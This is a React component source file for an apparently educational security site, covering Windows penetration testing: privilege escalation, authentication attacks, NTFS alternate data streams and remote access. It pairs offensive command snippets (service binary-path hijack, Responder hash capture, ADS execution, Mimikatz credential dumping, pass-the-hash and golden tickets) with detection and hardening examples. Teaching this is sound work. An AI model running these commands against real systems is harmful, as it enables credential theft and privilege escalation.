
import React from 'react';
import { Monitor, Shield, Bug, Terminal } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { 
  Accordion, 
  AccordionContent, 
  AccordionItem, 
  AccordionTrigger 
} from '@/components/ui/accordion';

const WindowsSection: React.FC = () => {
  return (
    <section className="space-y-12">
      <div className="mb-8">
        <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
          <Monitor className="text-cybr-primary" />
          Windows Penetration Testing
        </h2>
        <p className="mb-4">
          Windows environments are prevalent in enterprise settings and present unique security challenges.
          Penetration testing Windows systems requires understanding of the Windows architecture, security model,
          and common misconfigurations.
        </p>
      </div>
      
      <div className="card mb-10">
        <h3 className="text-2xl font-bold mb-6">Key Areas to Focus</h3>
        
        <Accordion type="single" collapsible className="w-full">
          <AccordionItem value="local-priv-esc">
            <AccordionTrigger className="text-lg font-semibold py-4 hover:bg-gray-50 dark:hover:bg-gray-800 px-4 rounded-lg">
              <div className="flex items-center gap-2">
                <Bug className="text-cybr-primary h-5 w-5" />
                Local Privilege Escalation
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-4 pt-2">
              <p className="mb-4">
                Privilege escalation techniques allow attackers to gain higher levels of access once they have some initial foothold on a Windows system. 
                These attacks exploit misconfigurations, unpatched vulnerabilities, and design flaws in the Windows operating system.
              </p>
              
              <div className="space-y-4 mb-4">
                <h4 className="text-md font-semibold">Common Vectors:</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>
                    <span className="font-semibold">Unquoted Service Paths</span>: When Windows service paths containing spaces are not properly quoted, 
                    Windows may execute a malicious executable placed in a higher directory level.
                  </li>
                  <li>
                    <span className="font-semibold">DLL Hijacking</span>: When applications search for DLLs in insecure paths, 
                    attackers can place malicious DLLs in those locations to be loaded by the application.
                  </li>
                  <li>
                    <span className="font-semibold">Always Install Elevated</span>: When Windows policies are misconfigured to allow
                    non-privileged users to install software with system privileges.
                  </li>
                  <li>
                    <span className="font-semibold">Scheduled Tasks</span>: Poorly configured scheduled tasks may run with elevated privileges 
                    and be modified by standard users.
                  </li>
                  <li>
                    <span className="font-semibold">Insecure Service Permissions</span>: Services with weak DACL permissions can be modified 
                    or reconfigured by non-administrative users.
                  </li>
                </ul>
              </div>
              
              <CodeExample
                language="powershell"
                title="Detecting Unquoted Service Paths"
                code={`# PowerShell command to find services with unquoted paths
Get-WmiObject -class Win32_Service | Where-Object {
  $_.PathName -match '.+\s.+\s.+' -and 
  $_.PathName -notmatch '^".*"$'
} | Select-Object Name, PathName`}
              />
              
              <CodeExample
                language="powershell"
                title="Exploiting Weak Service Permissions"
                code={`# Check service permissions
$serviceName = "VulnerableService"
$acl = Get-Acl -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$serviceName"
$acl | Format-List

# If vulnerable, modify service binary path
sc.exe config $serviceName binpath= "C:\\Windows\\Temp\\malicious.exe"`}
                isVulnerable={true}
              />
            </AccordionContent>
          </AccordionItem>
          
          <AccordionItem value="windows-auth">
            <AccordionTrigger className="text-lg font-semibold py-4 hover:bg-gray-50 dark:hover:bg-gray-800 px-4 rounded-lg">
              <div className="flex items-center gap-2">
                <Bug className="text-cybr-primary h-5 w-5" />
                Windows Authentication
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-4 pt-2">
              <p className="mb-4">
                Windows authentication mechanisms handle the verification of user identities across the network. 
                Due to legacy protocols and backward compatibility, there are numerous ways to exploit these authentication systems.
              </p>
              
              <div className="space-y-4 mb-4">
                <h4 className="text-md font-semibold">Common Attacks:</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>
                    <span className="font-semibold">NTLM Relay</span>: Intercepting NTLM authentication traffic and relaying it to 
                    another server to authenticate as the user.
                  </li>
                  <li>
                    <span className="font-semibold">Pass-the-Hash</span>: Using captured NTLM password hashes to authenticate without 
                    knowing the plaintext password.
                  </li>
                  <li>
                    <span className="font-semibold">Pass-the-Ticket</span>: Reusing Kerberos tickets to impersonate users without 
                    requiring their password.
                  </li>
                  <li>
                    <span className="font-semibold">Credential Dumping</span>: Extracting passwords, hashes, and tickets from memory 
                    using tools like Mimikatz.
                  </li>
                  <li>
                    <span className="font-semibold">LLMNR/NBT-NS Poisoning</span>: Responding to broadcast name resolution requests 
                    to capture authentication attempts.
                  </li>
                </ul>
              </div>
              
              <CodeExample
                language="powershell"
                title="Responder for LLMNR Poisoning"
                code={`# Command to run Responder to capture hashes
sudo python Responder.py -I eth0 -rdwv`}
                isVulnerable={true}
              />
              
              <CodeExample
                language="powershell"
                title="Defending Against Authentication Attacks"
                code={`# Disable LLMNR via Group Policy
New-GPO -Name "Disable LLMNR" 
Set-GPRegistryValue -Name "Disable LLMNR" -Key "HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient" -ValueName "EnableMulticast" -Type DWord -Value 0

# Enable SMB Signing
Set-GPRegistryValue -Name "Enable SMB Signing" -Key "HKLM\\System\\CurrentControlSet\\Services\\LanManWorkstation\\Parameters" -ValueName "RequireSecuritySignature" -Type DWord -Value 1
Set-GPRegistryValue -Name "Enable SMB Signing" -Key "HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters" -ValueName "RequireSecuritySignature" -Type DWord -Value 1`}
                isVulnerable={false}
              />
            </AccordionContent>
          </AccordionItem>
          
          <AccordionItem value="file-system">
            <AccordionTrigger className="text-lg font-semibold py-4 hover:bg-gray-50 dark:hover:bg-gray-800 px-4 rounded-lg">
              <div className="flex items-center gap-2">
                <Bug className="text-cybr-primary h-5 w-5" />
                File System Security
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-4 pt-2">
              <p className="mb-4">
                Windows NTFS file system has a complex permission model that, when misconfigured, can lead to information disclosure and privilege escalation.
              </p>
              
              <div className="space-y-4 mb-4">
                <h4 className="text-md font-semibold">Key Vulnerabilities:</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>
                    <span className="font-semibold">Weak NTFS Permissions</span>: Files or directories with overly permissive ACLs that allow unauthorized access.
                  </li>
                  <li>
                    <span className="font-semibold">Alternate Data Streams</span>: Hidden file streams that can be used to conceal malicious data.
                  </li>
                  <li>
                    <span className="font-semibold">Sensitive Files</span>: Configuration files, logs, or backup files that may contain credentials.
                  </li>
                  <li>
                    <span className="font-semibold">Registry Access</span>: Weak permissions on registry keys containing sensitive information or autorun settings.
                  </li>
                </ul>
              </div>
              
              <CodeExample
                language="powershell"
                title="Finding Weak File Permissions"
                code={`# PowerShell command to find world-writeable files in Program Files
Get-ChildItem "C:\\Program Files" -Recurse | Get-Acl | 
Where-Object {$_.AccessToString -match "Everyone.+Modify"} | 
Select-Object Path, AccessToString

# Check for files readable by authenticated users
Get-ChildItem "C:\\Program Files" -Recurse | Get-Acl | 
Where-Object {$_.AccessToString -match "Authenticated Users.+(Read|Modify)"} | 
Select-Object Path, AccessToString`}
              />
              
              <CodeExample
                language="powershell"
                title="Using Alternate Data Streams"
                code={`# Create a hidden ADS
echo "hidden malicious content" > file.txt:hidden.txt

# List all streams in a file
Get-Item -Path file.txt -Stream *

# Read from an ADS
Get-Content -Path file.txt -Stream hidden.txt

# Execute from an ADS (example of malicious use)
wmic process call create "C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m notepad.exe /c \\"cmd /c calc.exe:evil.exe\\""
`}
                isVulnerable={true}
              />
            </AccordionContent>
          </AccordionItem>
          
          <AccordionItem value="remote-access">
            <AccordionTrigger className="text-lg font-semibold py-4 hover:bg-gray-50 dark:hover:bg-gray-800 px-4 rounded-lg">
              <div className="flex items-center gap-2">
                <Bug className="text-cybr-primary h-5 w-5" />
                Remote Access
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-4 pt-2">
              <p className="mb-4">
                Windows provides various remote access mechanisms that can be targeted during penetration tests to gain initial access or move laterally.
              </p>
              
              <div className="space-y-4 mb-4">
                <h4 className="text-md font-semibold">Common Remote Access Vectors:</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>
                    <span className="font-semibold">RDP (Remote Desktop Protocol)</span>: Vulnerable to brute force, password spraying, and certain cryptographic attacks.
                  </li>
                  <li>
                    <span className="font-semibold">WinRM/PowerShell Remoting</span>: Often enabled in enterprise environments and can be abused if credentials are obtained.
                  </li>
                  <li>
                    <span className="font-semibold">SMB Shares</span>: Network file shares that may contain sensitive data or allow remote command execution.
                  </li>
                  <li>
                    <span className="font-semibold">Windows Firewall Bypasses</span>: Techniques to bypass firewall restrictions to access remote services.
                  </li>
                </ul>
              </div>
              
              <CodeExample
                language="powershell"
                title="SMB Share Enumeration"
                code={`# List available SMB shares
net view \\\\target-ip

# Check accessible shares
Get-WmiObject -Class Win32_Share -ComputerName target-ip

# Access SMB with specific credentials
net use \\\\target-ip\\C$ /user:domain\\username password

# PowerShell alternatives
$cred = Get-Credential
New-PSDrive -Name "S" -PSProvider "FileSystem" -Root "\\\\target-ip\\share" -Credential $cred`}
              />
              
              <CodeExample
                language="powershell"
                title="PowerShell Remoting"
                code={`# Enable PowerShell Remoting (requires admin)
Enable-PSRemoting -Force

# Create a remote session
$session = New-PSSession -ComputerName target-ip -Credential (Get-Credential)

# Execute commands remotely
Invoke-Command -Session $session -ScriptBlock { Get-Process }

# Enter interactive session
Enter-PSSession -Session $session

# WinRM over HTTP versus HTTPS (more secure)
New-PSSession -ComputerName target-ip -UseSSL -Credential (Get-Credential)`}
              />
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>
      
      <div className="mb-10">
        <h3 className="text-2xl font-bold mb-6">Windows Penetration Testing Techniques</h3>
        
        <div className="space-y-6">
          <SecurityCard
            title="PowerShell Empire"
            description="A post-exploitation framework that utilizes PowerShell to deliver attacks and maintain persistence on Windows systems."
            icon={<Terminal className="h-6 w-6" />}
            severity="high"
          />
          
          <div className="card">
            <h4 className="text-xl font-semibold mb-3 flex items-center gap-2">
              <Terminal className="text-cybr-primary h-5 w-5" />
              Mimikatz Usage
            </h4>
            <p className="mb-3">
              Mimikatz is a powerful tool for extracting plaintexts passwords, hashes, and Kerberos tickets from memory:
            </p>
            
            <CodeExample
              language="powershell"
              code={`# Privilege::debug to get debug privileges
privilege::debug

# Extract passwords from memory
sekurlsa::logonpasswords

# Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:target.local /ntlm:NTLMHashHere

# Golden ticket attack
kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-...`}
              title="Common Mimikatz Commands"
              isVulnerable={true}
            />
          </div>
          
          <div className="card">
            <h4 className="text-xl font-semibold mb-3 flex items-center gap-2">
              <Terminal className="text-cybr-primary h-5 w-5" />
              BloodHound
            </h4>
            <p className="mb-3">BloodHound is used to reveal the hidden and often unintended relationships within an Active Directory environment:</p>
            
            <CodeExample
              language="powershell"
              code={`# Using SharpHound collector
.\\SharpHound.exe -c All --outputdirectory C:\\BloodHound

# Or using the PowerShell collector
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\BloodHound`}
              title="BloodHound Data Collection"
            />
          </div>
        </div>
      </div>
      
      <div className="card">
        <h3 className="text-2xl font-bold mb-4">Defensive Measures</h3>
        <div className="space-y-4">
          <div>
            <h4 className="text-lg font-semibold">Securing Windows Systems</h4>
            <CodeExample
              language="powershell"
              code={`# Enable Windows Defender Credential Guard
# (In Group Policy Editor)
# Computer Configuration > Administrative Templates > System > Device Guard > Turn On Virtualization Based Security

# Check AppLocker status
Get-AppLockerPolicy -Effective | Format-List

# Disable unnecessary services
Get-Service WinRM | Stop-Service -PassThru | Set-Service -StartupType Disabled

# Enable PowerShell logging
New-Item -Path "HKLM:\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1`}
              title="Hardening Windows Systems"
              isVulnerable={false}
            />
          </div>
        </div>
      </div>
    </section>
  );
};

export default WindowsSection;
